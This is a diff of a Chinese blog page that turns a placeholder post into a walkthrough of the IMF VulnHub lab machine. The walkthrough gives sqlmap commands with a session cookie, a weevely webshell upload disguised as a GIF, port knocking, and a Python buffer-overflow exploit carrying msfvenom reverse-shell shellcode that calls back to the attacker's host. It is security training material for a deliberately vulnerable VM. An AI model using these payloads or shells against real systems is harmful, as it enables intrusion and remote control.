@@ -24,7 +24,7 @@
 
   
 
-  <title>Hello | Main1o</title>
+  <title>IMF靶机 | Main1o</title>
 
   
 
@@ -47,7 +47,7 @@
 <!-- header container -->
 <header class="header-container post">
   
-    <div class="post-image" style="background-image: url(/images/bobo.png)"></div>
+    <div class="post-image" style="background-image: url(/images/cover/wallhaven_1k185g.png)"></div>
   
 
   <!-- navbar -->
@@ -98,20 +98,18 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">Hello</h1>
+          <h1 class="title-wrap">IMF靶机</h1>
           <h2 class="title-sub-wrap">
             <strong>main1o</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-05-14T12:26:58.368Z" itemprop="datePublished">2022-05</time>
+            <time  class="article-date" datetime="2022-05-23T07:48:48.259Z" itemprop="datePublished">2022-05</time>
           </h2>
           <ul class="wrap-list dark">
   
-    <li><a href="/categories/python/">📒 python</a></li>
+    <li><a href="/categories/%E9%9D%B6%E6%9C%BA/">📒 靶机</a></li>
   
 </ul>
           <ul class="wrap-list dark">
-  
-    <li><a href="/tags/python/">🏷️ python</a></li>
   
 </ul>
         </div>
@@ -135,9 +133,106 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p>#测试~</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Hello,Words!&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><img src="/images/1.png" alt="原神"></p>
+        <h1 id="Vulnhub靶机"><a href="#Vulnhub靶机" class="headerlink" title="Vulnhub靶机"></a>Vulnhub靶机</h1><blockquote>
+<p>难度：中等</p>
+</blockquote>
+<p>信息收集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -f 192.168.100.142</span><br><span class="line"></span><br><span class="line">靶机只开放了80段口</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/imf/image-1.png" alt="image-1"></p>
+<p>页面源代码，找到第一个Flag_1</p>
+<p><code>echo &quot;YWxsdGhlZmlsZXM=&quot; | base64 -d</code>,得到<code>allthefiles</code></p>
+<p><img src="/images/imf/image-2.png" alt="image-2"></p>
+<p>文件名 疑似Base64,拼凑解码</p>
+<p><code>echo &quot;ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==&quot; | base64 -d </code></p>
+<p><code>flag2&#123;aW1mYWRtaW5pc3RyYXRvcg==&#125;</code> </p>
+<p>再解一下imfadministrator ， imf 的admin登录地址，访问</p>
+<p><img src="/images/imf/image-20220519091108594.png" alt="image-20220519091108594"></p>
+<p>页面提示，没有使用SQL，密码被编码了 (似乎在页面有一个叫’Roger’…)</p>
+<p><img src="/images/imf/image-20220519091527826.png" alt="image-20220519091527826"></p>
+<p><img src="/images/imf/image-20220519091533225.png" alt="image-20220519091533225"></p>
+<p>在首页的登录页面下也是有3个用户提示</p>
+<p><img src="/images/imf/image-20220519091844321.png" alt="image-20220519091844321"></p>
+<p>挨个测试,rmichaels 是可以登录的，就是没有密码</p>
+<blockquote>
+<p>通过之前的提示知道密码被编码的，那肯定要进行比较，猜测使用strcmp()函数进行对吧</p>
+<p>密码相等的话返回0。如何字符串和数组比较也是会返回0</p>
+</blockquote>
+<p><img src="/images/imf/image-20220519092035881.png" alt="image-20220519092035881"></p>
+<p>抓包，传入数组测试。绕过成功</p>
+<p><code>Flag3&#123;Y29udGludWVUT2Ntcw==&#125;</code>解码continueTOcms</p>
+<p><img src="/images/imf/image-20220519095226905.png" alt="image-20220519095226905"></p>
+<p><img src="/images/imf/image-20220519095300905.png" alt="image-20220519095300905"></p>
+<p>登录成功后，发现啥都没有</p>
+<p><img src="/images/imf/image-20220519095628340.png" alt="image-20220519095628340"></p>
+<p>尝试爆破二级目录。</p>
+<p><img src="/images/imf/image-20220519101035359.png" alt="image-20220519101035359"></p>
+<p>有文件上传的目录，但是没有上传点</p>
+<p>Url是可以传参的，试试sqlmap</p>
+<p><img src="/images/imf/image-20220519101435073.png" alt="image-20220519101435073"></p>
+<p><code>sqlmap -u &quot;http://192.168.100.142/imfadministrator/cms.php?pagename=disavowlist&quot; --dbs --batch --cookie=&quot;PHPSESSID=fb579gndjr8b3m9hojis09o3r6&quot;</code></p>
+<p>得到数据库，测试admin数据库下的唯一表 pages </p>
+<p><img src="/images/imf/image-20220519101642745.png" alt="image-20220519101642745"></p>
+<p><code>sqlmap -u &quot;http://192.168.100.142/imfadministrator/cms.php?pagename=disavowlist&quot;  --batch --cookie=&quot;PHPSESSID=fb579gndjr8b3m9hojis09o3r6&quot; -D admin  -T pages --dump</code></p>
+<p><img src="/images/imf/image-20220519102234579.png" alt="image-20220519102234579"></p>
+<p>访问得知，有一个图片，扫描得到<code>Flag4&#123;dXBsb2Fkcjk0Mi5waHA=&#125;</code>解码得<code>uploadr942.php</code></p>
+<p><img src="/images/imf/image-20220519102401957.png" alt="image-20220519102401957"></p>
+<p><img src="/images/imf/image-20220519102442082.png" alt="image-20220519102442082"></p>
+<p>访问上传页面目测只能上传图片，并且通过文件头和末尾判断，有htaccess文件</p>
+<p>使用weevely生成木马 带密码的</p>
+<p><code>weevely generate 1234 shell.php</code></p>
+<p>在头部添加进行绕过,源码有提示得文件名</p>
+<p><img src="/images/imf/image-20220519104116909.png" alt="image-20220519104116909"></p>
+<p><img src="/images/imf/image-20220519104126619.png" alt="image-20220519104126619"></p>
+<p>连接木马</p>
+<p><code>weevely http://192.168.100.142/imfadministrator/uploads/8cf3502f3c52.gif  1234</code></p>
+<p>查看Flag5_abc123def.txt</p>
+<p><img src="/images/imf/image-20220518205524441.png" alt="image-20220518205524441"></p>
+<p>得到提示<code>echo &quot;YWdlbnRzZXJ2aWNlcw==&quot; | base64 -d</code>, 还运行着一个叫agent的服务</p>
+<p><img src="/images/imf/image-20220518205243414.png" alt="image-20220518205243414"></p>
+<p>查看同级目录下的文件，接入的端口7482 8279 9467</p>
+<p><img src="/images/imf/image-20220518205852903.png" alt="image-20220518205852903"></p>
+<p>对于Agent这个程序的分析</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://g0blin.co.uk/imf-vulnhub-writeup/">g0blin Research: IMF VulnHub Writeup</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.icode9.com/content-4-893866.html">OSCP IMF </a></p>
+</blockquote>
+<p>得知要进行端口敲门，才能进行访问代理的端口</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/382577136">端口保护从端口敲门到单包授权</a></p>
+</blockquote>
+<p>方法一：</p>
+<p>下载工具<code>git clone https://github.com/grongor/knock.git</code></p>
+<p>在KALI进行端口敲门测试…</p>
+<p><img src="/images/imf/image-20220518210544021.png" alt="image-20220518210544021"></p>
+<p>方法二：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用nc依此对3个端口进行连接，即发送SYN数据包</span><br><span class="line"></span><br><span class="line">nc -nv 192.168.100.142 7482 &amp; </span><br><span class="line">nc -nv 192.168.100.142 8279 &amp; </span><br><span class="line">nc -nv 192.168.100.142 9467 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>方法三：</p>
+<p>使用 <code>Scapy</code>工具或者Python的<code>Scapy.all</code>模块发送SYN数据包</p>
+<p>对外开放了一个7788端口</p>
+<p><img src="/images/imf/image-20220519112551731.png" alt="image-20220519112551731"></p>
+<p><img src="/images/imf/image-20220518210702319.png" alt="image-20220518210702319"></p>
+<p>分析Agent知道需要进行溢出</p>
+<p>生成ShellCode，溢出拿到权限</p>
+<p><code>msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.100.101 lport=8877 -f python -b &quot;\x00\x0a\x0d&quot;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xba\x74\x40\x7e\xaf\xda\xd6\xd9\x74\x24\xf4\x58\x29&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x12\x31\x50\x12\x83\xe8\xfc\x03\x24\x4e\x9c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x5a\xf5\x95\x97\x46\xa6\x6a\x0b\xe3\x4a\xe4\x4a\x43&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x2c\x3b\x0c\x37\xe9\x73\x32\xf5\x89\x3d\x34\xfc\xe1&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x7d\x6e\x9a\x94\x15\x6d\x63\x74\x4b\xf8\x82\xc8\xf5&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xab\x15\x7b\x49\x48\x1f\x9a\x60\xcf\x4d\x34\x15\xff&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x02\xac\x81\xd0\xcb\x4e\x3b\xa6\xf7\xdc\xe8\x31\x16&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x50\x05\x8f\x59&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /usr/bin/python2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client.connect((<span class="string">&#x27;192.168.100.142&#x27;</span>, <span class="number">7788</span>))</span><br><span class="line">client.recv(<span class="number">512</span>)</span><br><span class="line">client.send(<span class="string">&quot;48093572\n&quot;</span>)</span><br><span class="line">client.recv(<span class="number">512</span>)</span><br><span class="line">client.send(<span class="string">&quot;3\n&quot;</span>)</span><br><span class="line">client.recv(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xba\x74\x40\x7e\xaf\xda\xd6\xd9\x74\x24\xf4\x58\x29&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x50\x12\x83\xe8\xfc\x03\x24\x4e\x9c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5a\xf5\x95\x97\x46\xa6\x6a\x0b\xe3\x4a\xe4\x4a\x43&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x2c\x3b\x0c\x37\xe9\x73\x32\xf5\x89\x3d\x34\xfc\xe1&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7d\x6e\x9a\x94\x15\x6d\x63\x74\x4b\xf8\x82\xc8\xf5&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xab\x15\x7b\x49\x48\x1f\x9a\x60\xcf\x4d\x34\x15\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x02\xac\x81\xd0\xcb\x4e\x3b\xa6\xf7\xdc\xe8\x31\x16&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x50\x05\x8f\x59&quot;</span></span><br><span class="line"></span><br><span class="line">buf += <span class="string">&quot;A&quot;</span> * (<span class="number">168</span> - <span class="built_in">len</span>(buf))</span><br><span class="line">buf += <span class="string">&quot;\x63\x85\x04\x08\n&quot;</span></span><br><span class="line">client.send(buf)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>监听本地~</p>
+<p><img src="/images/imf/image-20220519133457646.png" alt="image-20220519133457646"></p>
+<p>Flag6{R2gwc3RQcm90MGMwbHM&#x3D;}</p>
+<p>后续登录之后，php文件分析查看</p>
+<p>upload&#x2F;index.php</p>
+<p><img src="/images/imf/image-20220519145040561.png" alt="image-20220519145040561"></p>
+<p>upload&#x2F;cmd.php 注入点</p>
+<p><img src="/images/imf/image-20220519145238147.png" alt="image-20220519145238147"></p>
 
       </section>
 
@@ -187,7 +282,7 @@
         <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
 </svg>
-        1
+        0
       </div>
     </div>
   </div>
@@ -220,8 +315,8 @@
     <ul class="categorys-list">
       
         <li class="categorys-list-item">
-          <a href="/categories/python/">
-            python (1)
+          <a href="/categories/%E9%9D%B6%E6%9C%BA/">
+            靶机 (1)
           </a>
         </li>
       
@@ -238,7 +333,7 @@
   </div>
   <div class="widget-body">
     <div class="tags-cloud">
-      <a href="/tags/python/" style="font-size: 10px;" class="tags-cloud-0">python</a>
+      
     </div>
   </div>
 </section>
